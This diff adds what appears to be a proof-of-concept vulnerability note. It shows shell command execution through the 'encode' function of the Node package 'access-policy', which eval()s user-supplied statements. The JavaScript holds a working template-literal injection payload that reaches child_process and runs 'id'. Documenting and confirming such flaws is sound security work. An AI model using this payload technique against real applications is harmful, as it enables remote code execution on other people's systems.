@@ -1,0 +1,18 @@
+Confirmed: arbitrary shell command execution via `access-policy`'s `encode` function, which `eval()`s a template literal built from `JSON.stringify(statements)`.
+
+```javascript
+const ap = require("./node_modules/access-policy");
+
+// Any statement field (here: resource) can carry a template-literal
+// payload. encode.js does: eval('`' + JSON.stringify(statements).replace(/\$\{/g, '${data.') + '`')
+// which executes attacker-controlled JavaScript.
+const statements = [
+  {
+    action: "read",
+    resource: "${constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}"
+  }
+];
+
+const result = ap.encode(statements, { user: "attacker" });
+console.log(result);
+```
